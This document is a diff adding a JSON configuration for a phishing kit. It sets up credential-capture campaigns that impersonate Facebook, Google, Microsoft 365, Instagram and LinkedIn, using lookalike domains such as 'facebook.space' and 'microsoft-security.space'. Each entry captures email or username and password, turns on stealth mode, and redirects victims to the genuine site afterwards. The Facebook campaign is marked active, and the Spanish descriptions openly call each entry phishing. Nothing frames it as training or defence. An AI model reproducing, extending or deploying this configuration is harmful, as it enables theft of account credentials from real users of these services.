@@ -1,0 +1,67 @@
+{
+    "facebook": {
+        "domain": "facebook.space",
+        "ssl": true,
+        "active": true,
+        "template": "facebook_advanced",
+        "port": 443,
+        "redirect_url": "https://facebook.com",
+        "capture_fields": ["email", "password"],
+        "stealth_mode": true,
+        "user_agent_filter": false,
+        "geo_filter": false,
+        "description": "Facebook phishing con dominio registrado"
+    },
+    "google": {
+        "domain": "google-security.space",
+        "ssl": true,
+        "active": false,
+        "template": "google_advanced",
+        "port": 443,
+        "redirect_url": "https://accounts.google.com",
+        "capture_fields": ["email", "password"],
+        "stealth_mode": true,
+        "user_agent_filter": false,
+        "geo_filter": false,
+        "description": "Google login phishing avanzado"
+    },
+    "microsoft": {
+        "domain": "microsoft-security.space",
+        "ssl": true,
+        "active": false,
+        "template": "microsoft_advanced",
+        "port": 443,
+        "redirect_url": "https://login.microsoftonline.com",
+        "capture_fields": ["email", "password"],
+        "stealth_mode": true,
+        "user_agent_filter": false,
+        "geo_filter": false,
+        "description": "Microsoft 365 login phishing"
+    },
+    "instagram": {
+        "domain": "instagram-verify.space",
+        "ssl": true,
+        "active": false,
+        "template": "instagram_advanced",
+        "port": 443,
+        "redirect_url": "https://instagram.com",
+        "capture_fields": ["username", "password"],
+        "stealth_mode": true,
+        "user_agent_filter": false,
+        "geo_filter": false,
+        "description": "Instagram verification phishing"
+    },
+    "linkedin": {
+        "domain": "linkedin-security.space",
+        "ssl": true,
+        "active": false,
+        "template": "linkedin_advanced",
+        "port": 443,
+        "redirect_url": "https://linkedin.com",
+        "capture_fields": ["email", "password"],
+        "stealth_mode": true,
+        "user_agent_filter": false,
+        "geo_filter": false,
+        "description": "LinkedIn professional phishing"
+    }
+}
